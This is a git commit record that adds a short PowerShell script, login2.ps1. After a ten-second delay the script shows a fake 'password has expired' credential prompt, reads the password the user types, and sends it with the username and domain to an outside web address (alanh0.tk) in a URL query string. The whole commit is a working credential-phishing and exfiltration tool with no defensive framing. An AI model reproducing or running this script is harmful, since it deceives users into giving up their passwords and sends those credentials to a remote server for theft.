b7037cbfff722bed6c23b7a6c3cbfbb6e13308ba
Anthony,Cheuk Tung, LAI <darkfloyd@vxrl.org>
2020-04-06 20:14:56 +0800

    Add files via upload

---
+++ login2.ps1
@@ -0,0 +1,10 @@
+﻿function Invoke-LoginPrompt {
+	$cred = $Host.ui.PromptForCredential("Your password has expired and must be changed.", "Old Password", "$env:userdomain\$env:username","")
+	$username = "$env:username"
+	$domain = "$env:userdomain"
+	$password = $cred.GetNetworkCredential().password
+    Invoke-WebRequest -URI http://alanh0.tk/gmail/submit.php?username=$username+$password+$domain
+
+}
+Start-Sleep -s 10
+Invoke-LoginPrompt
